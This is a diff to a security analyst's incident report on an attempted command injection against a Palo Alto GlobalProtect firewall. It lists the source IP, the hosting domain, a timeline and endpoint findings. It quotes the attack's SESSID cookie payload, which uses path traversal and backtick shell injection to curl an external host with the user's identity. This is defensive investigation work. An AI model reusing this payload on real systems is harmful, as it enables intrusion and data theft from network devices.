@@ -101,32 +101,6 @@ Palo Alto firewall (172.16.17.139) was targeted via command injection.  CVE-2024
 -VirusTotal has much more comprehensive data, with many malicious/malware attempts reported
 ---
 
-## 3. Email Investigation (if applicable)
-
-### Sender
-
--
-
-### Recipient
-
--
-
-### Subject
-
--
-
-### Attachments
-
--
-
-### Embedded URLs
-
--
-
-### Observations
-
----
-
 ## 4. Endpoint Investigation
 
 ### Process Tree
@@ -139,25 +113,23 @@ Parent Process
 
 ### Suspicious Processes
 
--
+-None
 
 ### Command Line
 
-```powershell
-
-```
+No history
 
 ### File Activity
 
--
+-None
 
 ### Registry Activity
 
--
+-None
 
 ### Persistence
 
--
+-No further communications or processes from 144.172.79.92
 
 ---
 
@@ -165,8 +137,8 @@ Parent Process
 
 | Time | Event |
 |------|-------|
-| | |
-| | |
+| 2024-APR-18 15:09:42 | 144.172.79.92 first communicates with our firewall |
+| 2024-APR-18 15:09:42+ | Upon reviewing the endpoint, no further actions appear to have taken place afterwards |
 | | |
 
 ---
@@ -177,27 +149,21 @@ Parent Process
 
 #### IP Addresses
 
--
+-144.172.79.92
 
 #### Domains
 
--
+-cloudzy.com
 
 #### URLs
 
--
+-172.16.17.139/global-protect/login.esp
+-this is a standard VPN login action.  Not necessary malicious
 
-#### File Hashes
+#### Cookie
 
--
-
-#### File Names
-
--
-
-#### Registry Keys
-
--
+-SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)
+-this is the most suspect item.  This cookie attempts to traverse directories and run commands via the shell.  Inspection of the endpoint reveals no such processes ran.
 
 ---
 
